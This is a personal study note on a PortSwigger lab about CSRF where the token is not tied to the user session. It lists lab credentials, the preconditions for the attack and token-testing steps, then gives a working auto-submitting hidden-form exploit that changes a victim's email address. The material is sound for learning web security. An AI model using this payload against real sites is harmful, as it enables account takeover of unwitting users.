---
tags:
  - PRACTITIONER
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
---

# CSRF where token is not tied to user session
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`, `carlos:montoya`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - ***CSRF token is not tied to user session***

- **Testing CSRF Tokens:**
	1.  Remove CSRF token. and see if application accepts request.
	2. Change the request method from POST to GET.
	3. See if CSRF token is tied to a user session.

 - **Craft exploit**
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display: none" name="csrf-iframe"></iframe>
		<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe">
			<input type="hidden" name="email" value="anything@normal-user.net" >
			<input type="hidden" name="csrf" value="YOUR-CSRF-Token" >
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```
